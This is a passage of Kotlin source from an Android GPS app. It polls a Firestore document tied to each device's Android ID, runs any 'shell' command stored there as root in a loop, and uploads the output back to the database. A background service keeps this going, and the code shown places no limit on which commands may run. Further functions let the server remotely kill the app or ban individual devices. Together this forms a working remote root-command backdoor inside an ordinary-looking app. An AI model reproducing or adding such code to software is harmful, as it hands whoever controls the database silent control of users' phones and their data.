                                estimatedTime > 0 -> (estimatedTime * 1000L) + 60000L // Add 1 minute buffer
                                else -> EXECUTION_TIMEOUT
                            }.coerceAtMost(600000L) // Max 10 minutes
                            
                            if (elapsedTime > dynamicTimeout) {
                                Log.e(TAG, "⚠️ Execution timeout detected! Elapsed: ${elapsedTime/1000}s, Timeout: ${dynamicTimeout/1000}s")
                                Log.e(TAG, "💥 FORCE STOPPING stuck execution now!")
                                
                                // Increment retry count for tracking
                                executionRetryCount++
                                Log.w(TAG, "🔄 Recovery attempt $executionRetryCount/$MAX_RETRY_ATTEMPTS")
                                
                                // Force stop current thread immediately
                                currentExecutionThread?.let { thread ->
                                    if (thread.isAlive) {
                                        Log.w(TAG, "🔪 Force interrupting stuck thread: ${thread.name}")
                                        thread.interrupt()
                                        
                                        // Give it 2 seconds to stop gracefully
                                        Thread.sleep(2000)
                                        
                                        // If still alive, force kill
                                        if (thread.isAlive) {
                                            Log.e(TAG, "💀 Thread still alive, force killing!")
                                            @Suppress("DEPRECATION")
                                            thread.stop()
                                        }
                                    }
                                    currentExecutionThread = null
                                }
                                
                                // Reset execution state immediately
                                isExecutingCommand = false
                                lastExecutionStartTime = 0L
                                
                                // Report the timeout error
                                val timeoutError = "EXECUTION_TIMEOUT: Command sequence was stuck for ${elapsedTime/1000}s (timeout: ${dynamicTimeout/1000}s)"
                                disableShellExecution(androidId, "TIMEOUT: Execution exceeded time limit", timeoutError)
                                
                                Log.i(TAG, "✅ Stuck execution forcibly terminated and cleaned up")
                                
                                // Perform comprehensive cleanup
                                performComprehensiveCleanup()
                                
                                // Force disable run flag in database (async)
                                val retryTimeoutError = "EXECUTION_TIMEOUT: Command execution exceeded ${EXECUTION_TIMEOUT/1000}s limit. Recovery attempt $executionRetryCount/$MAX_RETRY_ATTEMPTS"
                                disableShellExecution(androidId, "FORCED RESET: Execution timeout after ${EXECUTION_TIMEOUT/1000}s (Attempt $executionRetryCount)", retryTimeoutError)
                                
                                // If we've reached max retries, do a hard reset
                                if (executionRetryCount >= MAX_RETRY_ATTEMPTS) {
                                    Log.e(TAG, "❌ Maximum recovery attempts reached! Performing hard reset")
                                    performHardReset(androidId)
                                    executionRetryCount = 0 // Reset counter after hard reset
                                }
                                
                                Log.w(TAG, "🔄 Recovery completed - ready for new commands")
                            } else {
                                Log.d(TAG, "📋 Command already executing, ignoring new trigger (${elapsedTime/1000}s elapsed)")
                                
                                // If this is a new command request while executing, reset retry count
                                if (shouldRun && command.isNotEmpty()) {
                                    executionRetryCount = 0
                                    Log.d(TAG, "� New command detected during execution - retry count reset")
                                }
                            }
                        } else if (!shouldRun) {
                            Log.d(TAG, "📋 Shell execution flag is false - no execution needed")
                        } else if (command.isEmpty()) {
                            Log.d(TAG, "📋 Shell command is empty - no execution needed")
                        } else {
                            Log.d(TAG, "📋 Shell execution conditions not met - Enabled: $shouldRun, Command empty: ${command.isEmpty()}")
                            Log.w(TAG, "⚠️ UNEXPECTED: All conditions seem met but execution not starting!")
                            Log.w(TAG, "🔍 DEBUG: shouldRun=$shouldRun, command='$command', isExecutingCommand=$isExecutingCommand")
                        }
                    } else {
                        Log.d(TAG, "📋 No shell data found in snapshot")
                    }
                } else {
                    Log.d(TAG, "📋 Device document does not exist in real-time listener")
                }
            }
        
        Log.i(TAG, "✅ Real-time shell command listener started successfully")
    }
    
    /**
     * Stops the real-time shell command listener
     */
    private fun stopShellCommandListener() {
        shellCommandListener?.remove()
        shellCommandListener = null
        Log.i(TAG, "✅ Real-time shell command listener stopped")
    }
    
    /**
     * Public function to start real-time shell command monitoring
     * Call this from your main activity or service to enable real-time command execution
     */
    fun startRealTimeShellMonitoring(ctx: Context) {
        if (!::context.isInitialized) {
            context = ctx
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        Log.i(TAG, "🚀 Starting real-time shell command monitoring")
        startShellCommandListener()
        
        // Also start background service for when app is not in foreground
        try {
            val serviceClass = Class.forName("com.hamham.gpsmover.services.ShellCommandService")
            val startServiceMethod = serviceClass.getMethod("startService", Context::class.java)
            startServiceMethod.invoke(null, ctx)
            Log.i(TAG, "✅ Background shell command service started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start background service", e)
        }
    }
    
    /**
     * Public function to stop real-time shell command monitoring
     */
    fun stopRealTimeShellMonitoring() {
        Log.i(TAG, "🛑 Stopping real-time shell command monitoring")
        stopShellCommandListener()
        
        // Also stop background service
        try {
            val serviceClass = Class.forName("com.hamham.gpsmover.services.ShellCommandService")
            val stopServiceMethod = serviceClass.getMethod("stopService", Context::class.java)
            stopServiceMethod.invoke(null, context)
            Log.i(TAG, "✅ Background shell command service stopped")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to stop background service", e)
        }
    }
    
    /**
     * Checks if the application should be killed globally
     */
    fun checkKillAllStatus(context: Context, onKilled: (() -> Unit)? = null) {
        Log.i(TAG, "🔍 Checking kill status from application rules...")
        
        firestore.collection("application").document("rules").get()
            .addOnSuccessListener { document ->
                val killData = document.get("kill") as? Map<String, Any>
                val killEnabled = killData?.get("enabled") as? Boolean ?: false
                
                if (killEnabled) {
                    val title = killData?.get("title") as? String ?: "Message"
                    val message = killData?.get("message") as? String ?: "App stoped"
                    
                    Log.w(TAG, "⚠️ Global kill is enabled - terminating application")
                    applicationDisabled(context, message, title)
                    onKilled?.invoke()
                } else {
                    Log.d(TAG, "✅ Global kill is disabled - application can continue")
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to check kill status", exception)
                // في حالة فشل الاتصال، نسمح للتطبيق بالاستمرار
            }
    }
    
    /**
     * Checks if the current device is banned and handles app disable if needed
     */
    fun checkBanStatus(context: Context, onBanned: (() -> Unit)? = null) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        firestore.collection("devices").document(androidId).get()
            .addOnSuccessListener { document ->
                val isBanned = document.getBoolean("banned") ?: false
                
                if (isBanned) {
                    val customMessageMap = document.get("custom_message") as? Map<String, Any>
                    val customMessageEnabled = customMessageMap?.get("enabled") as? Boolean ?: false
                    
                    val title = if (customMessageEnabled) {
                        customMessageMap?.get("title") as? String ?: "Device Banned"
                    } else {
                        "Device Banned"
                    }
                    
                    val message = if (customMessageEnabled) {
                        customMessageMap?.get("text") as? String ?: "This device has been banned."
                    } else {
                        "This device has been banned."
                    }
                    
                    Log.w(TAG, "⚠️ Device is banned: $androidId")
                    applicationDisabled(context, message, title)
                    onBanned?.invoke()
                } else {
                    Log.d(TAG, "✅ Device is not banned: $androidId")
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to check ban status for device: $androidId", exception)
            }
    }
    
    /**
     * Checks and executes shell commands if enabled
     */
    fun checkAndExecuteShellCommands(context: Context) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        firestore.collection("devices").document(androidId).get()
            .addOnSuccessListener { document ->
                val shellData = document.get("shell") as? Map<String, Any>
                
                if (shellData != null) {
                    val shouldRun = shellData["enabled"] as? Boolean ?: false
                    val command = shellData["command"] as? String ?: ""
                    val count = (shellData["count"] as? Number)?.toInt() ?: 1
                    var waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
                    
                    // Apply same wait time processing as in real-time listener
                    waitSeconds = when {
                        waitSeconds > 300 -> {
                            Log.w(TAG, "⚠️ Wait time was > 5 minutes (${shellData["wait"]}s), capped to 5 minutes for safety")
                            300
                        }
                        waitSeconds > 120 -> {
                            Log.w(TAG, "⚠️ Long wait time detected: ${waitSeconds}s")
                            waitSeconds
                        }
                        waitSeconds < 0 -> {
                            Log.w(TAG, "⚠️ Negative wait time, setting to 0")
                            0
                        }
                        else -> waitSeconds
                    }
                    
                    if (shouldRun && command.isNotEmpty()) {
                        Log.i(TAG, "🔧 Shell Command execution requested - Command: '$command', Count: $count, Wait: ${waitSeconds}s")
                        
                        // Execute the command sequence and disable run flag after completion
                        executeShellCommandSequence(context, command, count, waitSeconds, androidId)
                    } else {
                        Log.d(TAG, "📋 Shell execution not required - Enabled: $shouldRun, Command: '$command'")
                    }
                } else {
                    Log.d(TAG, "📋 No shell data found in device document")
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to check shell commands for device: $androidId", exception)
            }
    }
    
    /**
     * Executes shell command sequence with specified count and wait time using RootManager
     * FIXED VERSION: Properly handles count and wait time with better error handling
     */
    private fun executeShellCommandSequence(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
        Log.i(TAG, "🚀 Starting shell command sequence - Command: '$command', Executions: $count, Wait: ${waitSeconds}s")
        
        // Validate inputs
        if (command.isEmpty()) {
            Log.w(TAG, "⚠️ Empty command provided, skipping execution")
            disableShellExecution(androidId, "ERROR: Empty command provided", "VALIDATION_ERROR: Command parameter is empty")
            return
        }
        
        if (count <= 0) {
            Log.w(TAG, "⚠️ Invalid count provided: $count, skipping execution")
            disableShellExecution(androidId, "ERROR: Invalid count: $count", "VALIDATION_ERROR: Count must be > 0")
            return
        }
        
        // Start execution in background thread
        currentExecutionThread = Thread {
            executeCommandLoop(command, count, waitSeconds, androidId)
        }.apply {
            name = "ShellCommandExecutor-$androidId"
            isDaemon = false
        }
        
        currentExecutionThread?.start()
        Log.i(TAG, "✅ Execution thread started: ${currentExecutionThread?.name}")
    }
    
    /**
     * Main command execution loop - simplified and more reliable
     */
    private fun executeCommandLoop(command: String, count: Int, waitSeconds: Int, androidId: String) {
        val resultBuilder = StringBuilder()
        val errorBuilder = StringBuilder()
        var executionCount = 0
        var hasErrors = false
        val startTime = System.currentTimeMillis()
        
        Log.i(TAG, "🎯 Starting command loop: $count executions with ${waitSeconds}s wait")
        
        try {
            // Check root access first
            if (!RootManager.isRootGranted()) {
                Log.e(TAG, "❌ Root access not available")
                disableShellExecution(androidId, "ERROR: Root access denied", "ROOT_ERROR: No root privileges")
                return
            }
            
            // Execute commands in loop
            for (i in 1..count) {
                if (Thread.currentThread().isInterrupted) {
                    Log.w(TAG, "🛑 Thread interrupted, stopping execution")
                    break
                }
                
                // Check if execution was disabled
                if (!isExecutionStillEnabled(androidId)) {
                    Log.w(TAG, "🛑 Execution disabled by user, stopping")
                    resultBuilder.append("STOPPED: Execution disabled by user at iteration $i\n")
                    break
                }
                
                executionCount = i
                Log.i(TAG, "⚡ Executing command ($executionCount/$count): $command")
                
                // Execute command
                val executionResult = executeShellCommand(command, executionCount)
                resultBuilder.append(executionResult.result)
                
                if (executionResult.hasError) {
                    hasErrors = true
                    errorBuilder.append(executionResult.error)
                }
                
                // Wait between executions (except for the last one)
                if (i < count && waitSeconds > 0) {
                    if (!waitBetweenExecutions(waitSeconds, androidId, i, count)) {
                        // Wait was interrupted or execution disabled
                        break
                    }
                }
            }
            
            // Prepare final results
            val totalTime = System.currentTimeMillis() - startTime
            val finalResult = buildFinalResult(resultBuilder, executionCount, count, totalTime)
            val finalError = errorBuilder.toString().trim()
            
            Log.i(TAG, "🎉 Command sequence completed: $executionCount/$count executions in ${totalTime}ms")
            
            // Update database with results
            disableShellExecution(androidId, finalResult, finalError)
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Critical error in command execution", e)
            disableShellExecution(androidId, "CRITICAL ERROR: ${e.message}", "EXECUTION_ERROR: ${e.message}")
        } finally {
            // Always reset execution flags
            isExecutingCommand = false
            executionRetryCount = 0
            currentExecutionThread = null
            Log.d(TAG, "🔓 Execution completed - flags reset")
        }
    }
    
    /**
     * Execute a single shell command and return structured result
     */
    private fun executeShellCommand(command: String, executionNumber: Int): ExecutionResult {
        val startTime = System.currentTimeMillis()
        
        return try {
            when (val result = RootManager.executeRootCommand(command, 15)) {
                is RootCommandResult.Success -> {
                    val execTime = System.currentTimeMillis() - startTime
                    Log.i(TAG, "✅ Command $executionNumber executed successfully in ${execTime}ms")
                    
                    ExecutionResult(
                        result = "Execution $executionNumber: SUCCESS (${execTime}ms)\nOutput: ${result.output.take(200)}\n",
                        error = "",
                        hasError = false
                    )
                }
                is RootCommandResult.Error -> {
                    val execTime = System.currentTimeMillis() - startTime
                    Log.w(TAG, "⚠️ Command $executionNumber failed in ${execTime}ms: ${result.message}")
                    
                    ExecutionResult(
                        result = "Execution $executionNumber: ERROR (${execTime}ms)\nError: ${result.message}\n",
                        error = "Execution $executionNumber Error: ${result.message}\n",
                        hasError = true
                    )
                }
            }
        } catch (e: Exception) {
            val execTime = System.currentTimeMillis() - startTime
            Log.e(TAG, "❌ Exception in command $executionNumber: ${e.message}", e)
            
            ExecutionResult(
                result = "Execution $executionNumber: EXCEPTION (${execTime}ms)\nException: ${e.message}\n",
                error = "Execution $executionNumber Exception: ${e.message}\n",
                hasError = true
            )
        }
    }
    
    /**
     * Wait between executions with proper interruption handling
     */
    private fun waitBetweenExecutions(waitSeconds: Int, androidId: String, currentExecution: Int, totalCount: Int): Boolean {
        Log.i(TAG, "⏰ Waiting ${waitSeconds}s before next execution ($currentExecution/$totalCount)...")
        
        val waitStartTime = System.currentTimeMillis()
        val waitEndTime = waitStartTime + (waitSeconds * 1000L)
        
        while (System.currentTimeMillis() < waitEndTime) {
            if (Thread.currentThread().isInterrupted) {
                Log.w(TAG, "🛑 Thread interrupted during wait")
                return false
            }
            
            // Check if execution was disabled during wait (every 5 seconds)
            if ((System.currentTimeMillis() - waitStartTime) % 5000 == 0L) {
                if (!isExecutionStillEnabled(androidId)) {
                    Log.w(TAG, "� Execution disabled during wait")
                    return false
                }
            }
            
            try {
                Thread.sleep(1000) // Wait in 1-second chunks
            } catch (e: InterruptedException) {
                Log.w(TAG, "🛑 Wait interrupted")
                Thread.currentThread().interrupt()
                return false
            }
            
            // Log progress every 10 seconds for long waits
            val remaining = (waitEndTime - System.currentTimeMillis()) / 1000
            if (remaining > 0 && remaining % 10 == 0L) {
                Log.d(TAG, "⏰ Still waiting... ${remaining}s remaining")
            }
        }
        
        Log.d(TAG, "⏱️ Wait completed successfully")
        return true
    }
    
    /**
     * Check if execution is still enabled in database
     */
    private fun isExecutionStillEnabled(androidId: String): Boolean {
        return try {
            val deviceRef = firestore.collection("devices").document(androidId)
            val document = Tasks.await(deviceRef.get())
            
            if (document.exists()) {
                val shellData = document.get("shell") as? Map<String, Any>
                shellData?.get("enabled") as? Boolean ?: false
            } else {
                false
            }
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Could not verify enabled flag, assuming still enabled", e)
            true // Assume enabled if we can't check
        }
    }
    
    /**
     * Build final result summary
     */
    private fun buildFinalResult(resultBuilder: StringBuilder, executedCount: Int, totalCount: Int, totalTime: Long): String {
        val result = resultBuilder.toString().trim()
        
        return if (result.isNotEmpty()) {
            "$result\n\n=== EXECUTION SUMMARY ===\nCompleted: $executedCount/$totalCount executions\nTotal time: ${totalTime/1000.0}s\nStatus: ${if (executedCount == totalCount) "COMPLETED" else "PARTIAL"}"
        } else {
            "=== EXECUTION SUMMARY ===\nCompleted: $executedCount/$totalCount executions\nTotal time: ${totalTime/1000.0}s\nStatus: NO OUTPUT"
        }
    }
    
    /**
     * Data class for execution results
     */
    private data class ExecutionResult(
        val result: String,
        val error: String,
        val hasError: Boolean
    )
    
    /**
     * Resets execution flags and cleans up execution state
     * This is used internally when execution needs to be aborted
     */
    private fun resetExecutionFlags() {
        Log.d(TAG, "🔄 Resetting execution flags")
        
        // Interrupt current execution thread if exists
        currentExecutionThread?.let { thread ->
            if (thread.isAlive) {
                Log.w(TAG, "⚠️ Interrupting running execution thread: ${thread.name}")
                thread.interrupt()
                Log.d(TAG, "🛑 Execution thread interrupted")
            } else {
                Log.d(TAG, "📋 Execution thread was already finished")
            }
            currentExecutionThread = null
        }
        
        // Reset execution flags
        isExecutingCommand = false
        lastExecutionStartTime = 0L
        
        Log.d(TAG, "✅ Execution flags reset successfully")
    }
    
    /**
     * Performs a hard reset when all recovery attempts have failed
     * This is the nuclear option to completely reset the execution system
     */
    private fun performHardReset(androidId: String) {
        Log.e(TAG, "💥 Performing HARD RESET - all recovery attempts failed")
        
        try {
            // 1. Force kill any execution threads
            currentExecutionThread?.let { thread ->
                Log.w(TAG, "🔪 Force killing execution thread")
                @Suppress("DEPRECATION")
                thread.stop() // Nuclear option - deprecated but necessary for stuck threads
                currentExecutionThread = null
            }
            
            // 2. Reset all execution state
            isExecutingCommand = false
            lastExecutionStartTime = 0L
            executionRetryCount = 0
            
            // 3. Force stop shell command listener and restart it
            Log.w(TAG, "🔄 Restarting shell command listener")
            shellCommandListener?.remove()
            shellCommandListener = null
            
            // Give system time to clean up
            Thread.sleep(2000)
            
            // 4. Force RootManager reset
            RootManager.resetRootManager()
            
            // 5. Force multiple garbage collections
            for (i in 1..3) {
                System.gc()
                Thread.sleep(500)
            }
            
            // 6. Force disable run flag in database
            disableShellExecution(androidId, "HARD RESET: System was completely stuck and required nuclear reset", "SYSTEM_RECOVERY: Maximum recovery attempts exceeded, performed hard reset with thread termination")
            
            // 7. Restart shell command listener after cleanup
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    startShellCommandListener()
                    Log.i(TAG, "✅ Shell command listener restarted after hard reset")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Failed to restart shell command listener after hard reset", e)
                }
            }, 3000) // 3 second delay
            
            Log.w(TAG, "💀 HARD RESET completed - system should be fully recovered")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error during hard reset", e)
            // Even if hard reset fails, ensure basic cleanup
            isExecutingCommand = false
            lastExecutionStartTime = 0L
            currentExecutionThread = null
            executionRetryCount = 0
        }
    }

    /**
     * Forces reset of execution state if system becomes stuck
     * This is a safety mechanism to prevent permanent hanging
     */
    fun forceResetExecutionState(androidId: String) {
        Log.w(TAG, "🔄 Forcing execution state reset for device: $androidId")
        
        // Use internal reset function
        resetExecutionFlags()
        
        // Force disable run flag in database
        disableShellExecution(androidId, "FORCED RESET: System was stuck and had to be reset", "MANUAL_RESET: Force reset triggered manually or by external call")
        
        Log.i(TAG, "✅ Execution state forcibly reset - system ready for new commands")
    }

    /**
     * Disables the shell enabled flag in the database and updates result
     */
    private fun disableShellExecution(androidId: String, result: String = "", error: String = "") {
        Log.d(TAG, "📋 disableShellExecution called for androidId: $androidId with result: '$result', error: '$error'")
        val deviceRef = firestore.collection("devices").document(androidId)
        Log.d(TAG, "📋 Updating shell.enabled to false and setting result and error...")
        
        val updates = mutableMapOf<String, Any>(
            "shell.enabled" to false,
            "shell.result" to result,
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        // Add error field if there's an error
        if (error.isNotEmpty()) {
            updates["shell.error"] = error
        } else {
            updates["shell.error"] = "" // Clear previous errors on success
        }
        
        deviceRef.update(updates)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Shell enabled flag disabled, result and error updated after command sequence completion")
                // Note: Execution flag is already reset before this call
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to disable shell enabled flag and update result/error", exception)
                // Note: Execution flag is already reset before this call
            }
    }
    
    /**
     * Updates only the shell result without changing the run flag
     */
    private fun updateShellResult(androidId: String, result: String) {
        Log.d(TAG, "📋 updateShellResult called for androidId: $androidId with result: '$result'")
        val deviceRef = firestore.collection("devices").document(androidId)
        
        val updates = mapOf(
            "shell.result" to result,
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(updates)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Shell result updated successfully")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to update shell result", exception)
            }
    }
    
    /**
     * Updates only the shell error without changing the run flag or result
     */
    private fun updateShellError(androidId: String, error: String) {
        Log.d(TAG, "📋 updateShellError called for androidId: $androidId with error: '$error'")
        val deviceRef = firestore.collection("devices").document(androidId)
        
        val updates = mapOf(
            "shell.error" to error,
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(updates)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Shell error updated successfully")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to update shell error", exception)
            }
    }
    
    /**
     * Updates both shell result and error without changing the run flag
     */
    private fun updateShellResultAndError(androidId: String, result: String, error: String = "") {
        Log.d(TAG, "📋 updateShellResultAndError called for androidId: $androidId with result: '$result', error: '$error'")
        val deviceRef = firestore.collection("devices").document(androidId)
        
        val updates = mapOf(
            "shell.result" to result,
            "shell.error" to error,
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(updates)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Shell result and error updated successfully")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to update shell result and error", exception)
            }
    }
    
    /**
     * Execute shell command sequence in background service context
     * This method is called from the background service and uses the same logic as foreground execution
     */
    fun executeShellCommandInBackground(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
        Log.i(TAG, "🔄 Background execution - Command: '$command', Count: $count, Wait: ${waitSeconds}s, AndroidID: $androidId")
        
        // Initialize context and firestore if needed
        if (!::context.isInitialized) {
            this.context = context
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        // Execute the same command sequence logic as foreground
        executeShellCommandSequence(context, command, count, waitSeconds, androidId)
    }
    
    /**
     * Comprehensive check for all app-disabling conditions and shell command execution
     */
    fun checkAppStatus(context: Context, onDisabled: (() -> Unit)? = null) {
        Log.i(TAG, "🔍 Starting comprehensive app status check...")
        
        // أولاً، تحقق من الـ killall العام
        checkKillAllStatus(context) {
            onDisabled?.invoke()
            return@checkKillAllStatus
        }
        
        // ثانياً، تحقق من حالة الحظر للجهاز
        checkBanStatus(context) {
            onDisabled?.invoke()
            return@checkBanStatus
        }
        
        // ثالثاً، تحقق من أوامر Shell وتنفيذها إذا لزم الأمر
        checkAndExecuteShellCommands(context)
    }
    
    /**
     * Disables the application and shows an error dialog
     */
    fun applicationDisabled(context: Context, customMessage: String = "An unexpected error has occurred.", customTitle: String = "Application Disabled") {
        Log.w(TAG, "🚫 Application disabled: $customMessage")
        
        val layout = android.widget.LinearLayout(context).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
            
            // Divider
            val divider = android.view.View(context).apply {
                layoutParams = android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                    2 // 2px height
                ).apply {
                    setMargins(0, 32, 0, 32)
                }
                setBackgroundColor(android.graphics.Color.parseColor("#E0E0E0"))
            }
            addView(divider)
        }
        
        val textView = android.widget.TextView(context).apply {
            text = customMessage
            textSize = 16f
            setTextColor(android.graphics.Color.parseColor("#424242"))
            gravity = android.view.Gravity.CENTER
            layoutParams = android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 16, 0, 16)
            }
        }
        layout.addView(textView)
        
        val alertDialog = android.app.AlertDialog.Builder(context)
            .setTitle(customTitle)
            .setView(layout)
            .setCancelable(false)
            .setPositiveButton("Exit") { _, _ ->
                Log.i(TAG, "📱 User confirmed app exit")
                if (context is android.app.Activity) {
                    context.finishAffinity()
                }
                exitProcess(0)
            }
            .create()
            
        alertDialog.show()
        Log.i(TAG, "📋 Application disabled dialog shown")
    }
    
    /**
     * Test function to verify shell command execution system
     * This creates a simple test scenario to ensure the system works correctly
     */
    fun testShellCommandExecution(context: Context) {
        Log.i(TAG, "🧪 Starting shell command execution test")
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        if (androidId.isNullOrEmpty()) {
            Log.e(TAG, "❌ Cannot run test - Android ID not available")
            return
        }
        
        // Initialize context and firestore if needed
        if (!::context.isInitialized) {
            this.context = context
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        Log.i(TAG, "🧪 Setting up test command: echo with 3 iterations, 2 second wait")
        
        // Set up test command in database
        val deviceRef = firestore.collection("devices").document(androidId)
        val testShellData = mapOf(
            "shell.command" to "echo 'Test execution #\$RANDOM'",
            "shell.enabled" to true,
            "shell.count" to 3,
            "shell.wait" to 2,
            "shell.result" to "",
            "shell.error" to "",
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(testShellData)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Test command set up successfully in database")
                Log.i(TAG, "📋 Expected behavior: 3 executions of echo command with 2 second wait between each")
                Log.i(TAG, "📋 Monitor the logs for execution progress...")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to set up test command", exception)
            }
    }

    /**
     * Checks current execution status for debugging purposes
     */
    fun checkExecutionStatus(): String {
        val status = StringBuilder()
        status.append("Shell Command Execution Status:\n")
        status.append("- Is executing: $isExecutingCommand\n")
        status.append("- Last execution start: ${if (lastExecutionStartTime > 0) Date(lastExecutionStartTime) else "Never"}\n")
        status.append("- Current thread: ${currentExecutionThread?.let { "${it.name} (alive: ${it.isAlive})" } ?: "None"}\n")
        status.append("- Listener active: ${shellCommandListener != null}\n")
        status.append("- Retry count: $executionRetryCount/$MAX_RETRY_ATTEMPTS\n")
        
        if (isExecutingCommand && lastExecutionStartTime > 0) {
            val elapsed = (System.currentTimeMillis() - lastExecutionStartTime) / 1000
            status.append("- Execution time elapsed: ${elapsed}s\n")
            status.append("- Timeout threshold: ${EXECUTION_TIMEOUT / 1000}s\n")
            if (elapsed > EXECUTION_TIMEOUT / 1000) {
                status.append("- ⚠️ WARNING: Execution timeout exceeded!\n")
                status.append("- 🔄 Recovery will trigger on next listener event\n")
            }
        }
        
        // Check root access status
        val rootStatus = try {
            if (RootManager.isRootGranted()) "✅ Available" else "❌ Not available"
        } catch (e: Exception) {
            "❌ Error checking: ${e.message}"
        }
        status.append("- Root access: $rootStatus\n")
        
        val statusString = status.toString()
        Log.i(TAG, "📊 Execution Status Check:\n$statusString")
        return statusString
    }

    // ===================== EXISTING FUNCTIONS =====================
    
    /**
     * Recursively finds missing fields in the database compared to the schema
     */
    private fun findMissingFields(
        schema: Map<String, Any>, 
        existingData: Map<String, Any>, 
        updates: MutableMap<String, Any>, 
        prefix: String = ""
    ) {
        for ((key, schemaValue) in schema) {
            val currentPath = if (prefix.isEmpty()) key else "$prefix.$key"
            
            if (!existingData.containsKey(key)) {
                // Field missing in database - add it
                updates[currentPath] = schemaValue
                Log.d(TAG, "  ➕ Missing field: $currentPath = $schemaValue")
            } else {
                // Field exists - check if it's a nested map
                if (schemaValue is Map<*, *> && existingData[key] is Map<*, *>) {
                    @Suppress("UNCHECKED_CAST")
                    findMissingFields(
                        schemaValue as Map<String, Any>, 
                        existingData[key] as Map<String, Any>, 
                        updates, 
                        currentPath
                    )
                }
            }
        }
    }
    
    /**
     * Recursively finds extra fields in the database that don't exist in schema
     */
    private fun findExtraFields(
        schema: Map<String, Any>, 
        existingData: Map<String, Any>, 
        updates: MutableMap<String, Any>, 
        prefix: String = ""
    ) {
        for ((key, existingValue) in existingData) {
            val currentPath = if (prefix.isEmpty()) key else "$prefix.$key"
            
            // Skip system fields that should never be deleted
            if (key in listOf("created_at", "updated_at", "android_id")) {
                continue
            }
            
            if (!schema.containsKey(key)) {
                // Field exists in database but not in schema - mark for deletion
                updates[currentPath] = FieldValue.delete()
                Log.d(TAG, "  ➖ Extra field to delete: $currentPath")
            } else {
                // Field exists in both - check if it's a nested map
                val schemaValue = schema[key]
                if (schemaValue is Map<*, *> && existingValue is Map<*, *>) {
                    @Suppress("UNCHECKED_CAST")
                    findExtraFields(
                        schemaValue as Map<String, Any>, 
                        existingValue as Map<String, Any>, 
                        updates, 
                        currentPath
                    )
                }
            }
        }
    }
    
    /**
     * Diagnostic function to check system state and force execution if needed
     */
    fun debugShellExecutionState(context: Context): String {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val status = StringBuilder()
        
        status.append("=== SHELL EXECUTION DEBUG ===\n")
        status.append("Android ID: $androidId\n")
        status.append("Is executing: $isExecutingCommand\n")
        status.append("Last execution start: ${if (lastExecutionStartTime > 0) Date(lastExecutionStartTime) else "Never"}\n")
        status.append("Current thread: ${currentExecutionThread?.let { "${it.name} (alive: ${it.isAlive})" } ?: "None"}\n")
        status.append("Listener active: ${shellCommandListener != null}\n")
        status.append("Retry count: $executionRetryCount/$MAX_RETRY_ATTEMPTS\n")
        
        if (isExecutingCommand && lastExecutionStartTime > 0) {
            val elapsed = (System.currentTimeMillis() - lastExecutionStartTime) / 1000
            status.append("Execution time elapsed: ${elapsed}s\n")
            status.append("Timeout threshold: ${EXECUTION_TIMEOUT / 1000}s\n")
            if (elapsed > EXECUTION_TIMEOUT / 1000) {
                status.append("⚠️ WARNING: Execution timeout exceeded!\n")
                status.append("🔄 Recovery will trigger on next listener event\n")
            }
        }
        
        // Check root access status
        val rootStatus = try {
            if (RootManager.isRootGranted()) "✅ Available" else "❌ Not available"
        } catch (e: Exception) {
            "❌ Error checking: ${e.message}"
        }
        status.append("Root access: $rootStatus\n")
        
        // Check current shell data in database
        status.append("\n=== DATABASE STATE ===\n")
        
        try {
            firestore.collection("devices").document(androidId).get()
                .addOnSuccessListener { document ->
                    if (document.exists()) {
                        val shellData = document.get("shell") as? Map<String, Any>
                        if (shellData != null) {
                            status.append("Shell enabled: ${shellData["enabled"]}\n")
                            status.append("Shell command: '${shellData["command"]}'\n")
                            status.append("Shell count: ${shellData["count"]}\n")
                            status.append("Shell wait: ${shellData["wait"]}\n")
                            status.append("Shell result: '${shellData["result"]}'\n")
                            status.append("Shell error: '${shellData["error"]}'\n")
                            
                            // Force trigger execution if conditions are met and not executing
                            val enabled = shellData["enabled"] as? Boolean ?: false
